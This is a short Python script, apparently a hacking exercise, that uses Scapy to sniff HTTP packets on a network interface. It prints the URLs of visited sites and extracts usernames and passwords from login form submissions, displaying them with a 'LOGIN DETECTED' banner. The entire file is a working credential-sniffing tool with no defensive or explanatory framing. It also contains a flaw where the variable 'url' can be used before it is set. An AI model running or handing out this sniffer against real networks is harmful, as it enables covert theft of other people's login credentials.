import scapy.all as scp
from scapy.layers import http
import optparse

def packages(pack):
    if pack.haslayer(http.HTTPRequest):

        if not pack[http.HTTPRequest].Referer == None:
            url = pack[http.HTTPRequest].Referer.decode("utf-8")
            print(f"URL of visited site is {url} ")

        if pack.haslayer("Raw"):
            raw = pack["Raw"].load

            if isinstance(raw, bytes):
                raw = raw.decode("utf-8")                
                if not raw.startswith("action"):
                    name_and_password = raw.split("&")
                    name = name_and_password[0].split("=")[1]
                    password = name_and_password[1].split("=")[1]

                    print(f"!!!LOGIN DETECTED at {url}!!!\n\tUSERNAME is {name} and  PASSWORD is {password}")
            else:
                print(raw)

def sniffer(interface):
    scp.sniff(iface=interface, store=False, prn=packages)

if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-i","--interface", help="Interface that you use such as (wlan0, eth0)",dest="interface")
    args = parser.parse_args()[0]

    if args.interface == None:
        print("Enter an interface or -h/--help to see usage")
    else:
        sniffer(args.interface)